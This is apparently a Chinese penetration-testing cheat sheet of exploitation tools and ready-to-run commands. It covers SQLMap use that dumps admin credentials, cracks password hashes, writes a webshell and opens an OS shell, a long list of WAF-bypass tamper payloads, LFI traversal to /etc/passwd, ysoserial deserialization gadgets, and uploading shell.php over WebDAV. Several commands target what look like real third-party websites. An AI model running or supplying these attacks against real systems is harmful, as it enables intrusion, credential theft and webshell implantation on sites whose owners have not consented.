漏洞利用
========================================

漏洞查询
----------------------------------------
- searchsploit
	+ ``更新：searchsploit -u`` 
	+ ``poc位置：linux/remote/13853.pl``
	+ ``下载：searchsploit -m php/webapps/7185.php`` 

C2服务器
----------------------------------------
- `Ninja <https://github.com/ahmedkhlief/Ninja/>`_
- `Covenant <https://github.com/cobbr/Covenant>`_
- `WSC2 <https://github.com/ver007/WSC2>`_
- `Cobalt Strike <https://blog.cobaltstrike.com/category/cobalt-strike-2/>`_
- `GRAT2 <https://github.com/r3nhat/GRAT2.git>`_
- `MeetC2 <https://github.com/CMatri/MeetC2>`_

web代理
----------------------------------------
- burpsuite
	+ 插件收录：https://github.com/Prodject/BurpSuite-collections
	+ Shiro插件：https://github.com/pmiaowu/BurpShiroPassiveScan
	+ J2EE插件：https://github.com/ilmila/J2EEScan
	+ wooyun漏洞插件：https://github.com/boy-hack/wooyun-payload
	+ Struts2-RCE: https://github.com/prakharathreya/Struts2-RCE
	+ Fastjson：https://github.com/Maskhe/FastjsonScan
	+ spring扫描：https://github.com/metaStor/SpringScan
	+ log4j2Scan：https://github.com/whwlsfb/Log4j2Scan
- Yakit
	+ 项目地址：``https://github.com/yaklang/yakit``
	+ Burpsuite 的年轻中国挑战者。

补丁比对
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `Zynamics Bindiff <https://dl.google.com/dl/zynamics/bindiff430.msi>`_
- `turbodiff <https://www.coresecurity.com/corelabs-research/open-source-tools/turbodiff>`_
- `patchdiff2 <https://code.google.com/archive/p/patchdiff2/downloads>`_
- `diaphora <http://diaphora.re/>`_

数据库注入
----------------------------------------
- SQLMap
	+ 默认选择不询问用户输入
		- ``--batch``
	+ 显示注入详细信息
		- ``-v``
	+ 指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）
		- ``sqlmap -u http://www.vuln.cn/post.php?id=1  –dbms mysql –level 3``
	+ cookie注入
		- ``sqlmap -u http://www.baidu.com/shownews.asp –cookie “id=11” –level 2``
	+ 列举数据库管理系统中的用户
		- ``–users``
	+ 列举并破解数据库管理系统用户密码Hash值
		- ``--passwords -v 1``
	+ 列举数据库管理系统的用户权限
		- ``–privileges``
	+ 指定注入技术
		- ``--technique B/T/E/U/S``，分别为布尔注入，时间盲注，报错注入，联合查询注入，堆查询注入
	+ POST注入
		- ``sqlmap -u http://vip.fj0730.cn/login.asp --forms`` 
	+ POST查找数据库
		- ``sqlmap -u http://vip.fj0730.cn/login.asp --forms --dbs`` 
	+ POST查找当前的数据库
		- ``sqlmap -u http://vip.fj0730.cn/login.asp --forms --current-db`` 
	+ POST查找表名
		- ``sqlmap -u http://vip.fj0730.cn/login.asp --forms -D vip_0730 --tables`` 
	+ POST查找列名
		- ``sqlmap -u http://vip.fj0730.cn/login.asp --forms -D vip_0730 -T admin --columns`` 
	+ POST爆出数据
		- ``sqlmap -u http://vip.fj0730.cn/login.asp --forms -D vip_0730 -T admin -C user_name,user_pwd --dump`` 
	+ POST指定表单
		- ``sqlmap -u http://vip.fj0730.cn/login.asp --data "userid=aaa&passwd=bbbb"`` 
	+ POST加载文件
		- ``sqlmap -r "post.txt" -p n --dbs`` 
	+ POST查找当前数据库
		- ``--current-db`` 
	+ 读取与写入文件
		- 前提：首先找需要网站的物理路径，其次需要有可写或可读权限.
		- 读取文件：``sqlmap -u "http:/192.168.3.2/Less-1/?id=1" --file-read "C:/post.txt"``
		- 写入文件：``sqlmap -r "c:\request.txt" –dbms mysql --file-dest "c:\www\webshell.php" --file-write "f:\local.php"``
	+ 执行命令
		- ``sqlmap -u http://192.168.159.1/news.php?id=1 --os-cmd=ipconfig`` 
	+ 使用shell命令
		- ``sqlmap -r “c:\tools\request.txt” -p id –dms mysql –-os-shell``
	+ tamper脚本
		::
		
			注：可以同时使用多个脚本，tamper存储在/usr/share/sqlmap/tamper下。
			apostrophemask.py
			适用数据库：ALL
			作用：将引号替换为utf-8，用于过滤单引号
			使用脚本前：tamper("1 AND '1'='1")
			使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871

			base64encode.py
			适用数据库：ALL
			作用：替换为base64编码
			使用脚本前：tamper("1' AND SLEEP(5)#")
			使用脚本后：MScgQU5EIFNMRUVQKDUpIw==

			multiplespaces.py
			适用数据库：ALL
			作用：围绕sql关键字添加多个空格
			使用脚本前：tamper('1 UNION SELECT foobar')
			使用脚本后：1 UNION SELECT foobar

			space2plus.py
			适用数据库：ALL
			作用：用加号替换空格
			使用脚本前：tamper('SELECT id FROM users')
			使用脚本后：SELECT+id+FROM+users

			nonrecursivereplacement.py
			适用数据库：ALL
			作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）
			使用脚本前：tamper('1 UNION SELECT 2--')
			使用脚本后：1 UNIOUNIONN SELESELECTCT 2--

			space2randomblank.py
			适用数据库：ALL
			作用：将空格替换为其他有效字符
			使用脚本前：tamper('SELECT id FROM users')
			使用脚本后：SELECT%0Did%0DFROM%0Ausers

			unionalltounion.py
			适用数据库：ALL
			作用：将union allselect 替换为unionselect
			使用脚本前：tamper('-1 UNION ALL SELECT')
			使用脚本后：-1 UNION SELECT

			securesphere.py
			适用数据库：ALL
			作用：追加特定的字符串
			使用脚本前：tamper('1 AND 1=1')
			使用脚本后：1 AND 1=1 and '0having'='0having'

			space2dash.py
			适用数据库：ALL
			作用：将空格替换为--，并添加一个随机字符串和换行符
			使用脚本前：tamper('1 AND 9227=9227')
			使用脚本后：1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227

			space2mssqlblank.py
			适用数据库：Microsoft SQL Server
			测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005
			作用：将空格随机替换为其他空格符号('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')
			使用脚本前：tamper('SELECT id FROM users')
			使用脚本后：SELECT%0Eid%0DFROM%07users

			between.py
			测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
			作用：用NOT BETWEEN 0 AND #替换>
			使用脚本前：tamper('1 AND A > B--')
			使用脚本后：1 AND A NOT BETWEEN 0 AND B--

			percentage.py
			适用数据库：ASP
			测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0
			作用：在每个字符前添加一个%
			使用脚本前：tamper('SELECT FIELD FROM TABLE')
			使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E

			sp_password.py
			适用数据库：MSSQL
			作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password
			使用脚本前：tamper('1 AND 9227=9227-- ')
			使用脚本后：1 AND 9227=9227-- sp_password

			charencode.py
			测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
			作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）
			使用脚本前：tamper('SELECT FIELD FROM%20TABLE')
			使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45

			randomcase.py
			测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
			作用：随机大小写
			使用脚本前：tamper('INSERT')
			使用脚本后：INseRt

			charunicodeencode.py
			适用数据库：ASP、ASP.NET
			测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3
			作用：适用字符串的unicode编码
			使用脚本前：tamper('SELECT FIELD%20FROM TABLE')
			使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045

			space2comment.py
			测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
			作用：将空格替换为/**/
			使用脚本前：tamper('SELECT id FROM users')
			使用脚本后：SELECT/**/id/**/FROM/**/users

			equaltolike.py
			测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5
			作用：将=替换为LIKE
			使用脚本前：tamper('SELECT * FROM users WHERE id=1')
			使用脚本后：SELECT * FROM users WHERE id LIKE 1

			equaltolike.py
			测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
			作用：将>替换为GREATEST，绕过对>的过滤
			使用脚本前：tamper('1 AND A > B')
			使用脚本后：1 AND GREATEST(A,B+1)=A

			ifnull2ifisnull.py
			适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)
			测试通过数据库：MySQL 5.0 and 5.5
			作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤
			使用脚本前：tamper('IFNULL(1, 2)')
			使用脚本后：IF(ISNULL(1),2,1)

			modsecurityversioned.py
			适用数据库：MySQL
			测试通过数据库：MySQL 5.0
			作用：过滤空格，使用mysql内联注释的方式进行注入
			使用脚本前：tamper('1 AND 2>1--')
			使用脚本后：1 /*!30874AND 2>1*/--

			space2mysqlblank.py
			适用数据库：MySQL
			测试通过数据库：MySQL 5.1
			作用：将空格替换为其他空格符号('%09', '%0A', '%0C', '%0D', '%0B')
			使用脚本前：tamper('SELECT id FROM users')
			使用脚本后：SELECT%0Bid%0DFROM%0Cusers

			modsecurityzeroversioned.py
			适用数据库：MySQL
			测试通过数据库：MySQL 5.0
			作用：使用内联注释方式（/*!00000*/）进行注入
			使用脚本前：tamper('1 AND 2>1--')
			使用脚本后：1 /*!00000AND 2>1*/--

			space2mysqldash.py
			适用数据库：MySQL、MSSQL
			作用：将空格替换为 -- ，并追随一个换行符
			使用脚本前：tamper('1 AND 9227=9227')
			使用脚本后：1--%0AAND--%0A9227=9227

			bluecoat.py
			适用数据库：Blue Coat SGOS
			测试通过数据库：MySQL 5.1,、SGOS
			作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=
			使用脚本前：tamper('SELECT id FROM users where id = 1')
			使用脚本后：SELECT%09id FROM users where id LIKE 1

			versionedkeywords.py
			适用数据库：MySQL
			测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11
			作用：注释绕过
			使用脚本前：tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')
			使用脚本后：1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#

			halfversionedmorekeywords.py
			适用数据库：MySQL < 5.1
			测试通过数据库：MySQL 4.0.18/5.0.22
			作用：在每个关键字前添加mysql版本注释
			使用脚本前：tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")
			使用脚本后：value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa


			space2morehash.py
			适用数据库：MySQL >= 5.1.13
			测试通过数据库：MySQL 5.1.41
			作用：将空格替换为#，并添加一个随机字符串和换行符
			使用脚本前：tamper('1 AND 9227=9227')
			使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227

			apostrophenullencode.py
			适用数据库：ALL
			作用：用非法双字节Unicode字符替换单引号
			使用脚本前：tamper("1 AND '1'='1")
			使用脚本后：1 AND %00%271%00%27=%00%271

			appendnullbyte.py
			适用数据库：ALL
			作用：在有效载荷的结束位置加载null字节字符编码
			使用脚本前：tamper('1 AND 1=1')
			使用脚本后：1 AND 1=1%00

			chardoubleencode.py
			适用数据库：ALL
			作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）
			使用脚本前：tamper('SELECT FIELD FROM%20TABLE')
			使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545

			unmagicquotes.py
			适用数据库：ALL
			作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格
			使用脚本前：tamper("1' AND 1=1")
			使用脚本后：1%bf%27 AND 1=1--

			randomcomments.py
			适用数据库：ALL
			作用：用注释符分割sql关键字
			使用脚本前：tamper('INSERT')
			使用脚本后：I/**/N/**/SERT

- `bbqsql <https://github.com/Neohapsis/bbqsql>`_

非结构化数据库注入
----------------------------------------
- `NoSQLAttack <https://github.com/youngyangyang04/NoSQLAttack>`_
- `NoSQLMap <https://github.com/codingo/NoSQLMap>`_
- `Nosql Exploitation Framework <https://github.com/torque59/Nosql-Exploitation-Framework>`_
- `MongoDB audit <https://github.com/stampery/mongoaudit>`_

数据库漏洞利用
----------------------------------------
- `mysql unsha1 <https://github.com/cyrus-and/mysql-unsha1>`_

XSS
----------------------------------------
- `BeEF <https://github.com/beefproject/beef>`_
- `XSS Reciver <https://github.com/firesunCN/BlueLotus_XSSReceiver>`_
- `DSXS <https://github.com/stamparm/DSXS>`_
- `XSStrike <https://github.com/s0md3v/XSStrike>`_
- `xsssniper <https://github.com/gbrindisi/xsssniper>`_
- `tracy <https://github.com/nccgroup/tracy>`_
- `crlfuzz <https://github.com/dwisiswant0/crlfuzz>`_
- `CRLF-Injection-Scanner <https://github.com/MichaelStott/CRLF-Injection-Scanner>`_

SSRF
----------------------------------------
- `SSRFmap <https://github.com/swisskyrepo/SSRFmap>`_
- `SSRF Proxy <https://github.com/bcoles/ssrf_proxy>`_
- `Gopherus <https://github.com/tarunkant/Gopherus>`_
- `SSRF Testing <https://github.com/cujanovic/SSRF-Testing>`_

模版注入
----------------------------------------
- `tplmap <https://github.com/epinna/tplmap>`_

命令注入
----------------------------------------
- `commix <https://github.com/commixproject/commix>`_

LFI
----------------------------------------
- `LFISuite <https://github.com/D35m0nd142/LFISuite>`_
- `FDsploit <https://github.com/chrispetrou/FDsploit>`_
	+ 目录遍历漏洞发现
		| ``python3 fdsploit.py -u http://192.168.100.106/index.php?page=about -d 8``
	+ LFI漏洞发现
		| ``python3 fdsploit.py -u http://192.168.100.106/index.php?page=about -d 7 -k root -p /etc/passwd``
		| -k 响应包中搜索关键字
		| -p 指定包含的文件
		| -d 指定路径包含的深度
- burpsuite
	+ Intruder->Sniper
		::
		
			file=§1§/etc/passwd
			选择Sniper攻击方式，payload type选择Character blocks
			Base string:../
			Min length:0
			Max length:20
			step:1

DNS 隧道
----------------------------------------
- `dnstunnel de <https://dnstunnel.de/>`_
- `iodine <https://code.kryo.se/iodine/>`_
- `dnscat2 <https://github.com/iagox86/dnscat2>`_

XXE
----------------------------------------
- `XXEinjector <https://github.com/enjoiz/XXEinjector>`_
- `XXER <https://github.com/TheTwitchy/xxer>`_

反序列化
----------------------------------------
+ php序列化
	- `phpggc <https://github.com/wh1t3p1g/phpggc>`_
+ java序列化工具
	- Ysomap
		+ 地址：``https://github.com/wh1t3p1g/ysomap``
		+ 帮助：``https://github.com/wh1t3p1g/ysomap/wiki/YSOMAP%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8C%97``
	- java ysoserial：``https://github.com/frohoff/ysoserial``
	- JRE8u20 RCE Gadget：``https://github.com/pwntester/JRE8u20_RCE_Gadget``
	- Java Serialization Dumper：``https://github.com/NickstaDB/SerializationDumper``
	- gadgetinspector <https://github.com/JackOfMostTrades/gadgetinspector>`_ A byte code analyzer for finding deserialization gadget chains in Java applications
+ c# .net序列化工具
	- `.net ysoserial <https://github.com/pwntester/ysoserial.net>`_
		::
		
			./ysoserial.exe -p DotNetNuke -M run_command -C calc.exe
			./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
			./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
			./ysoserial.exe -p DotNetNuke -M run_command -C calc.exe
			./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
			./ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust

中间人攻击
----------------------------------------
- `mitmproxy <https://github.com/mitmproxy/mitmproxy>`_
- `MITMf <https://github.com/byt3bl33d3r/MITMf>`_
- `ssh mitm <https://github.com/jtesta/ssh-mitm>`_
- `injectify <https://github.com/samdenty99/injectify>`_
- `Responder <https://github.com/lgandx/Responder>`_ Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. 

webdav利用
----------------------------------------
- webdav批量扫描：IISPutScanner
- `webdav利用工具 <http://www.webdav.org/cadaver/>`_
	+ ``cadaver http://door.legacyhangtuah.com/webdav/``
	+ 上传webshell: ``put shell.php``